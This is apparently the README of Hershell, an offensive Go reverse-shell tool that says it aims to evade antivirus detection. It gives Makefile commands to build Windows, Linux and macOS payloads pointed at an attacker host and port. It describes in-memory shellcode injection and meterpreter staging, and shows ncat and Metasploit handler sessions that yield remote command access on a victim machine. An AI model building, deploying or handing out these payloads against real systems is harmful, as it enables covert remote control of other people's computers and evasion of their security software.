# Hershell

Simple TCP reverse shell written in [Go](https://golang.org).

It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives

## Why ?

Although meterpreter payloads are great, they are sometimes spotted by AV products.

The goal of this project is to get a simple reverse shell, which can work on multiple systems.

## How ?

Since it's written in Go, you can cross compile the source for the desired architecture.

## Getting started & dependencies

As this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
your Golang environment (with the `$GOPATH` environment variable).

Then, just run `go get github.com/lesnuages/hershell` to fetch the project.

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
- ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
- ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
- ``macos32`` : builds a mac os 32 bits executable (Mach-O)
- ``macos64`` : builds a mac os 64 bits executable (Mach-O)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Using the shell

Once executed, you will be provided with a remote shell.
This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.

The following special commands are supported:

* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it
* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
* ``exit`` : exit gracefully

## Usage

First of all, you will need to generate a valid certificate:
```bash
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

For windows:

```bash
# Predifined 32 bit target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make windows64 LHOST=192.168.0.12 LPORT=1234
```

For Linux:
```bash
# Predifined 32 bit target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make linux64 LHOST=192.168.0.12 LPORT=1234
```

For Mac OS X
```bash
$ make macos LHOST=192.168.0.12 LPORT=1234
```

## Examples

### Basic usage

One can use various tools to handle incomming connections, such as:

* socat
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

Here is an example with `ncat`:

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 172.16.122.105.
Ncat: Connection from 172.16.122.105:47814.
[hershell]> whoami
desktop-3pvv31a\lab
```

### Meterpreter staging

**WARNING**: this currently only work for the Windows platform.

The meterpreter staging currently supports the following payloads :

* `windows/meterpreter/reverse_tcp`
* `windows/x64/meterpreter/reverse_tcp`
* `windows/meterpreter/reverse_http`
* `windows/x64/meterpreter/reverse_http`
* `windows/meterpreter/reverse_https`
* `windows/x64/meterpreter/reverse_https`

To use the correct one, just specify the transport you want to use (tcp, http, https)

To use the meterpreter staging feature, just start your handler:

```bash
[14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
lhost => 172.16.122.105
[14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
lport => 8443
[14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
HandlerSSLCert => ./server.pem
[14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://172.16.122.105:8443
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
```

Then, in `hershell`, use the `meterpreter` command:

```bash
[hershell]> meterpreter https 172.16.122.105:8443
```

A new meterpreter session should pop in `msfconsole`:

```bash
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
[*] [2018.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
[*] Meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100

[14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  DESKTOP-3PVV31A\lab @ DESKTOP-3PVV31A  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)

[14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-3PVV31A\lab
```

## Credits

[@khast3x](https://github.com/khast3x) for the Dockerfile feature
